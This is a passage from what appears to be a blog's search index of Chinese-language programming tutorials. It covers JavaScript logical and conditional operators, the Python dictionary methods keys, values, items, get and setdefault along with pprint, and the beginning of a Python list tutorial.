align="center">返回值规则</th></tr></thead><tbody><tr><td align="center"><code>||</code></td><td align="center">逻辑或</td><td align="center">真值&#x2F;假值</td><td align="center">✔️</td><td align="center">返回第一个 <strong>真值</strong></td></tr><tr><td align="center"><code>&amp;&amp;</code></td><td align="center">逻辑与</td><td align="center">真值&#x2F;假值</td><td align="center">✔️</td><td align="center">返回第一个 <strong>假值</strong></td></tr><tr><td align="center"><code>|</code></td><td align="center">按位或</td><td align="center">二进制位</td><td align="center">❌</td><td align="center">按位或运算（转32位整数）</td></tr><tr><td align="center"><code>&amp;</code></td><td align="center">按位与</td><td align="center">二进制位</td><td align="center">❌</td><td align="center">按位与运算（转32位整数）</td></tr></tbody></table><ul><li><p><strong>注意：</strong></p><ul><li><code>||</code>如果发现有一个为true，直接返回<code>true</code></li><li><code>&amp;&amp;</code>如果发现有一个为false，直接返回<code>false</code></li></ul><p><code>|</code> <code>&amp;</code>这两个运算符则需要判断两边的真假值才会输出结果，所以<code>||</code>和<code>&amp;&amp;</code>的效率更快，推荐在大部情况使用。</p></li><li><p><strong>条件运算符</strong></p><ul><li><strong>语法：</strong><code>条件 ? 表达式1 : 表达式2</code><ul><li>如果条件为真（<code>true</code>），返回 <code>表达式1</code> 的值。</li><li>如果条件为假（<code>false</code>），返回 <code>表达式2</code> 的值。</li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="literal">true</span></span><br><span class="line"><span class="keyword">let</span> str = a ? <span class="string">&#x27;是真的&#x27;</span> : <span class="string">&#x27;是假的&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br></pre></td></tr></table></figure><ul><li>解释：由于 <code>a</code> 是 <code>true</code>，三元运算符会选择第一个表达式 <code>&#39;是真的&#39;</code>，将其赋值给 <code>str</code>，代码运行后会在控制台输出：<code>&#39;是真的&#39;</code>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--字典</title>
      <link href="/2025/04/16/Python%E5%AD%A6%E4%B9%A0--%E5%AD%97%E5%85%B8/"/>
      <url>/2025/04/16/Python%E5%AD%A6%E4%B9%A0--%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><blockquote><p>[!NOTE]</p><p>以下内容部分摘录自<code>《Python编程快速上手——让繁琐的工作自动化（第二版）》</code>，并加入了一些自己的理解，仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-字典数据类型"><a href="#1-字典数据类型" class="headerlink" title="1. 字典数据类型"></a>1. 字典数据类型</h2><p>​像列表一样，字典是许多值的集合，但不像列表的索引，字典的索引可以使用许多不同的数据类型，不只是整数。</p><ul><li><strong>字典的索引</strong>：字典的索引被称之为“键”，键及其关联的值被称之为“键-值对”。</li><li><strong>注意</strong>：字典输入时带<code>&#123;&#125;</code>。</li></ul><p>​接下来我们可以试着创建一个字典并赋给变量<code>myCat</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myCat = &#123;<span class="string">&#x27;size&#x27;</span>: <span class="string">&#x27;fat&#x27;</span>, <span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;gray&#x27;</span>, <span class="string">&#x27;disposition&#x27;</span>:<span class="string">&#x27;loud&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(myCat[<span class="string">&#x27;size&#x27;</span>]) <span class="comment"># 输出的结果是fat</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;My cat has &#x27;</span> + myCat[<span class="string">&#x27;color&#x27;</span>] + <span class="string">&#x27; fur&#x27;</span>) <span class="comment"># 输出的结果是My cat has gray fur</span></span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：变量<code>myCat</code>中的这个字典的键就是<code>size</code>、<code>color</code>和<code>disposition</code>，而他们相对应的值对就是<code>fat</code>、<code>gray</code>、<code>loud</code>。而我们<code>print</code>所打印的值就是这些值。</li></ul><p>​就像列表一样字典也可以用整数作为键，但他可以是任何数字，不必用零开始，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="number">12345</span>: <span class="string">&#x27;Luggage Combination&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;The Answer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(spam[<span class="number">12345</span>], spam[<span class="number">42</span>]) <span class="comment"># 输出的结果为Luggage Combination The Answer</span></span><br></pre></td></tr></table></figure><h3 id="1-1-字典与列表"><a href="#1-1-字典与列表" class="headerlink" title="1.1 字典与列表"></a>1.1 字典与列表</h3><p><strong>不像列表，字典中的项目是不排序的。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dogs&#x27;</span>, <span class="string">&#x27;moose&#x27;</span>]</span><br><span class="line">bacon = [<span class="string">&#x27;dogs&#x27;</span>, <span class="string">&#x27;moose&#x27;</span>, <span class="string">&#x27;cats&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(spam == bacon) <span class="comment"># 输出的结果为False</span></span><br><span class="line"></span><br><span class="line">eggs = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Zophie&#x27;</span>, <span class="string">&#x27;species&#x27;</span>: <span class="string">&#x27;cats&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;8&#x27;</span>&#125;</span><br><span class="line">ham = &#123;<span class="string">&#x27;species&#x27;</span>: <span class="string">&#x27;cats&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Zophie&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(eggs == ham) <span class="comment"># 输出的结果为True</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：在名为<code>spam</code>的列表中，第一项是<code>spam[0]</code>，但在字典中没有“第一个”项，虽然在确定两个列表是否相同的，表象的顺序很重要，但在字典中“键-值对”输入的顺序并不重要。（因为字典是不排序的，所以不能像列表那样切片）。</li></ul><p><strong>尝试访问列表中不存在的键，将会出现<code>KeyError</code>报错信息</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Zophie&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">7</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(spam[<span class="string">&#x27;color&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：输入以上代码并试着运行起来就会发现<code>KeyError</code>错误信息。</li></ul><p><strong>我们可以通过字典是不排序的，可以使用任意的值来作为键来编写一个小程序，用来记录朋友的生日</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">birthdays = &#123;<span class="string">&#x27;Alice&#x27;</span>: <span class="string">&#x27;Apr 1&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>: <span class="string">&#x27;Dec 12&#x27;</span>, <span class="string">&#x27;Carol&#x27;</span>: <span class="string">&#x27;Mar 4&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Enter a name : (blank to quit)&#x27;</span>)</span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> birthdays:</span><br><span class="line">        <span class="built_in">print</span>(birthdays[name] + <span class="string">&#x27; is the birthday of &#x27;</span> + name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;I do not have birthday information for &#x27;</span> + name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;What is their birthday?&#x27;</span>)</span><br><span class="line">        bday = <span class="built_in">input</span>()</span><br><span class="line">        birthdays[name] = bday <span class="comment">#将字典中没有的项 添加进字典中</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Birthday database updated&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(birthdays)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：这里创建了一个字典将他保存到名叫<code>birthday</code>的变量中，用来存放生日。用<code>in</code>关键字，可以查看输入的名字是否作为键存放在字典中。如果在字典中，我们可以用<code>[]</code>访问他们关联的值，如果不在我们可以用同样的方法添加他们。（程序终止时输入的所有数据就丢失了，因为我们没有将他们保存在硬盘文件中。）</li></ul><h3 id="1-2-keys-、values-和item-方法"><a href="#1-2-keys-、values-和item-方法" class="headerlink" title="1.2 keys()、values()和item()方法"></a>1.2 <code>keys()</code>、<code>values()</code>和<code>item()</code>方法</h3><p>​字典中有三个方法，他们将返回类似列表的值，分别对应字典的键、值、键-值对：<code>keys()</code>、<code>values()</code>和<code>item()</code>方法。这些方法返回的值不是真正的列表，他们不可被修改，没有<code>append()</code>方法，但这些数据类型 可以使用for循环。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">42</span>&#125;</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> spam.values():</span><br><span class="line">    <span class="built_in">print</span>(v) <span class="comment"># 输出的结果为red和42</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> spam.keys():</span><br><span class="line">    <span class="built_in">print</span>(k) <span class="comment"># 输出的结果为color和age</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> spam.items():</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># 输出的结果为(&#x27;color&#x27;, &#x27;red&#x27;)和(&#x27;age&#x27;, 42)</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>解释</strong>：利用<code>keys()</code>、<code>values()</code>和<code>item()</code>方法，循环分别可以迭代键、值、键-值对。需要注意的是，<code>item()</code>方法返回的<code>dict_item</code>值包含的是键和值的元组，如果希望的到一个真正的列表，就把类似列表的值返回给list()函数，具体如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam2 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">42</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(spam2.keys()) <span class="comment"># 输出的结果为dict_keys([&#x27;color&#x27;, &#x27;age&#x27;])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(spam2.keys())) <span class="comment"># 输出的结果为[&#x27;color&#x27;, &#x27;age&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>list(sapm2.keys())</code>代码接收<code>keys()</code>函数返回的<code>dict_keys</code>值，并传给<code>list()</code>函数，然后返回一个列表，即<code>[&#39;color&#39;, &#39;age&#39;]</code>。</li></ul></li></ul><p>​也可以利用多重赋值技巧，在for循环中将键和值赋给不同的变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam3 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">42</span>&#125;</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> spam3.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Key: &#x27;</span> + k + <span class="string">&#x27; Value: &#x27;</span> + <span class="built_in">str</span>(v)) <span class="comment"># 输出的结果为Key: color Value: red和Key: age Value: 42</span></span><br></pre></td></tr></table></figure><h3 id="1-3-检查字典中是否存在键或值"><a href="#1-3-检查字典中是否存在键或值" class="headerlink" title="1.3 检查字典中是否存在键或值"></a>1.3 检查字典中是否存在键或值</h3><p>​<code>in</code>或者<code>in not</code>操作符可以检查值是否存在于列表中,也可以利用这些操作符检查某个键或值是否存在于字典中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Zophie&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">7</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> spam.keys()) <span class="comment"># 输出的结果为True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Zophie&#x27;</span> <span class="keyword">in</span> spam.values()) <span class="comment"># 输出的结果为True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> spam.keys()) <span class="comment"># 输出的结果为False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;color&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> spam.keys()) <span class="comment"># 输出的结果为True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> spam) <span class="comment"># 输出的结果为False</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：请注意 在前面的例子中<code>‘color&#39; in spam</code>本质上是一个简写的版本 相当于<code>&#39;color&#39; in spam.keys()</code>，这种情况总是对的 如果要想检查一个值是否为字典中的键 就可以将关键字<code>in</code>或者<code>not in</code>作用于该字典本身。</li></ul><h3 id="1-4-get-方法"><a href="#1-4-get-方法" class="headerlink" title="1.4 get()方法"></a>1.4 <code>get()</code>方法</h3><p>​在访问一个值之前，检查该键是否在字典中，这很麻烦。这里我们用到<code>get()</code>方法，他有两个参数：1.要取得其值的键 2.当该键不存在时，返回备用的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">picnicItems = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;cups&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;I am bringing &#x27;</span> + <span class="built_in">str</span>(picnicItems.get(<span class="string">&#x27;cups&#x27;</span>, <span class="number">0</span>)) + <span class="string">&#x27; cups.&#x27;</span>) <span class="comment"># 输出的结果是I am bringing 2 cups</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;I am bringing &#x27;</span> + <span class="built_in">str</span>(picnicItems.get(<span class="string">&#x27;eggs&#x27;</span>, <span class="number">0</span>)) + <span class="string">&#x27; eggs.&#x27;</span>) <span class="comment"># 输出的结果是I am bringing 0 eggs</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：因为<code>picnicItems</code>字典中没有<code>&#39;eggs&#39;</code>键 所以<code>get()</code>方法返回的默认值是0，不使用<code>get()</code>方法就会报错。</li></ul><p>1.5 <code>setdefault()</code>方法</p><p>​我们常常需要为字典中的某一个键设置一个默认值，当该键没有任何值使用它时。代码看起来像这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Pooka&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;color&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> spam:</span><br><span class="line">    spam[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;black&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(spam)</span><br></pre></td></tr></table></figure><p>​<code>setdefualt()</code>方法提供了一种方式，可以在一行中完成这件事，该方法有两个参数：1.第一个参数是要检查的键（即查看该键是否在字典中）2.第二个参数是当该键不存在时需要设置的值。注意：如果该键的确存在，<code>setdefualt()</code>方法就会返回键的值，如果不存在则会返回<code>setdefualt()</code>方法的第二个参数值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Pooka&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(spam.setdefault(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;black&#x27;</span>)) <span class="comment"># 输出的结果为black</span></span><br><span class="line"><span class="built_in">print</span>(spam) <span class="comment"># 输出的结果为&#123;&#x27;name&#x27;: &#x27;Pooka&#x27;, &#x27;age&#x27;: 5, &#x27;color&#x27;: &#x27;black&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(spam.setdefault(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;white&#x27;</span>)) <span class="comment"># 输出的结果为black</span></span><br><span class="line"><span class="built_in">print</span>(spam) <span class="comment"># 输出的结果为&#123;&#x27;name&#x27;: &#x27;Pooka&#x27;, &#x27;age&#x27;: 5, &#x27;color&#x27;: &#x27;black&#x27;&#125;</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：当第一次调用<code>setdefualt()</code>方法时，<code>spam</code>变量中的字典变为<code>&#123;&#39;color&#39;: &#39;black&#39;, &#39;age&#39;: 5, &#39;name&#39;: &#39;Pooka&#39;&#125;</code>，该方法的返回值为<code>black</code>。</li><li><strong>解释</strong>：当第二次调用<code>setdefualt()</code>方法时，我们可以发现输出的结果没有变化，这是因为<code>spam</code>变量中的字典里已经有了名为<code>&#39;color&#39;</code>的键了。</li></ul><p>​<code>setdefualt()</code>方法是一个很好的快捷方式，可以确保有一个键的存在，下面这个程序可以计算一个字符串中每个字符出现的次数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="string">&#x27;It was a bright cold day in April, and the clocks were striking thirteen.&#x27;</span> </span><br><span class="line">count = &#123;&#125; </span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> message: </span><br><span class="line">    count.setdefault(character, <span class="number">0</span>)</span><br><span class="line">    count[character] = count[character] + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)    </span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>message</code>存放我们需要计算的字符串，<code>count = &#123;&#125;</code>这里我们初始化了一个空字典，用来存放字符及其出现次数，<code>for character in message:</code>这里我们遍历字符串（包括空格和标点符号），一次将字符赋值给变量<code>character</code>，<code>count.setdefault(character, 0)</code>这里我们调用<code>setdefualt()</code>方法：若 <code>character</code> 不在字典中，则添加该键并设置默认值 <code>0</code>，若已存在，则不改变其当前值。最后我们在使用<code>count[character] = count[character] + 1</code>将当前字符的计数值加1，更新到字典中。</li></ul><h2 id="2-美观的输出"><a href="#2-美观的输出" class="headerlink" title="2. 美观的输出"></a>2. 美观的输出</h2><p>​如果程序中导入了<code>pprint()</code>模块，就可以使用<code>pprint()</code>和<code>pformat()</code>函数，这些函数将为我们美观的输出一个字典，以我们上方的字符串计算程序为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line">message = <span class="string">&#x27;It was a bright cold day in April, and the clocks were striking thirteen.&#x27;</span></span><br><span class="line">count = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> message:</span><br><span class="line">    count.setdefault(character, <span class="number">0</span>)</span><br><span class="line">    count[character] = count[character] + <span class="number">1</span></span><br><span class="line">pprint.pprint(count)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pprint.pformat(count))</span><br></pre></td></tr></table></figure><p>​以上代码的输出结果如下（<code>pprint.pprint()</code>与<code>print(pprint.pformat())</code>是等价的，所以我们只展示一遍。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27; &#x27;: 13,</span><br><span class="line"> &#x27;,&#x27;: 1,</span><br><span class="line"> &#x27;.&#x27;: 1,</span><br><span class="line"> &#x27;A&#x27;: 1,</span><br><span class="line"> &#x27;I&#x27;: 1,</span><br><span class="line"> &#x27;a&#x27;: 4,</span><br><span class="line"> &#x27;b&#x27;: 1,</span><br><span class="line"> &#x27;c&#x27;: 3,</span><br><span class="line"> &#x27;d&#x27;: 3,</span><br><span class="line"> &#x27;e&#x27;: 5,</span><br><span class="line"> &#x27;g&#x27;: 2,</span><br><span class="line"> &#x27;h&#x27;: 3,</span><br><span class="line"> &#x27;i&#x27;: 6,</span><br><span class="line"> &#x27;k&#x27;: 2,</span><br><span class="line"> &#x27;l&#x27;: 3,</span><br><span class="line"> &#x27;n&#x27;: 4,</span><br><span class="line"> &#x27;o&#x27;: 2,</span><br><span class="line"> &#x27;p&#x27;: 1,</span><br><span class="line"> &#x27;r&#x27;: 5,</span><br><span class="line"> &#x27;s&#x27;: 3,</span><br><span class="line"> &#x27;t&#x27;: 6,</span><br><span class="line"> &#x27;w&#x27;: 2,</span><br><span class="line"> &#x27;y&#x27;: 1&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--列表</title>
      <link href="/2025/03/26/Python%E5%AD%A6%E4%B9%A0-%E5%88%97%E8%A1%A8/"/>
      <url>/2025/03/26/Python%E5%AD%A6%E4%B9%A0-%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><blockquote><p>[!NOTE]</p><p>以下内容部分摘录自<code>《Python编程快速上手——让繁琐的工作自动化（第二版）》</code>，并加入了一些自己的理解，仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-列表基础"><a href="#1-列表基础" class="headerlink" title="1.列表基础"></a>1.列表基础</h2><ul><li><p><strong>列表的数据类型</strong>：列表是一个值，包含由多个值构成的序列，列表值看起来像这样：<code>[&#39;cat&#39;, &#39;bat&#39;, &#39;rat&#39;, &#39;elephant&#39;]</code>。</p></li><li><p><strong>用索引取得列表中的单个值</strong>：</p><ul><li>假定列表<code>[&#39;cat&#39;, &#39;bat&#39;, &#39;rat&#39;, &#39;elephant&#39;]</code>保存在名为<code>spam</code>的变量中 <code>spam[0]</code>将求值为<code>&#39;cat&#39;</code>，以此类推。</li><li>如果使用的索引超出了列表中值的个数python将给出<code>IndexError</code>错误。索引只能是整数，不能是浮点数 否则将导致<code>TypeError</code>错误。</li><li>列表也可以包含其他列表值，如：<code>spam = [[&#39;cat&#39;, &#39;bat&#39;], [10, 20, 30, 40, 50]]</code>，则：<code>spam[0] = [&#39;cat&#39;, &#39;bat&#39;]</code> 、<code>spam[0][1] = &#39;bat&#39;</code>、<code>spam[1][4] = 50</code>。</li></ul></li><li><p><strong>负数索引</strong>：虽然索引从0开始并向上增长，但也可以用负整数作为索引，整数值<code>-1</code>指的是列表中最后一个索引，整数值<code>-2</code>则是指列表中的倒是第二个索引，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;elephant&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(spam[-<span class="number">1</span>]) <span class="comment"># 输出的结果为elephat</span></span><br><span class="line"><span class="built_in">print</span>(spam[-<span class="number">3</span>]) <span class="comment"># 输出的结果为bat</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用切片取得子列表</strong>：</p><ul><li><p>切片可以从列表中于取得多个值，所得的结果是一个新列表。像<code>spam[1:4]</code>这样的形式就是一个切片。</p></li><li><p>在一个切片中第一个整数是切片开始处的索引，第二个整数是切片结束处的索引，切片向上增长直至第二个引索的值，但不包括它，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;elephant&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(spam[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment"># 输出结果为[&#x27;cat&#x27;, &#x27;bat&#x27;, &#x27;rat&#x27;, &#x27;elephant&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(spam[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment"># 输出结果为[&#x27;bat&#x27;, &#x27;rat&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(spam[<span class="number">0</span>:-<span class="number">1</span>]) <span class="comment"># 输出结果为[&#x27;cat&#x27;, &#x27;bat&#x27;, &#x27;rat&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>用<code>len（）</code>函数取得列表的长度</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;moose&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(spam)) <span class="comment"># 输出结果为3</span></span><br></pre></td></tr></table></figure></li><li><p><strong>用索引改变列表中的值</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;elephant&#x27;</span>]</span><br><span class="line">spam[<span class="number">1</span>] = <span class="string">&#x27;aardvark&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(spam) <span class="comment"># 输出的结果为[&#x27;cat&#x27;, &#x27;aardvark&#x27;, &#x27;rat&#x27;, &#x27;elephant&#x27;]</span></span><br></pre></td></tr></table></figure></li><li><p><strong>列表连接和列表复制</strong>：</p><ul><li>连接：<code>[1, 2, 3] + [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;] = [1, 2, 3, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;]</code></li><li>复制：<code>[&#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;] * 3 = [&#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;X&#39;, &#39;Y&#39;, 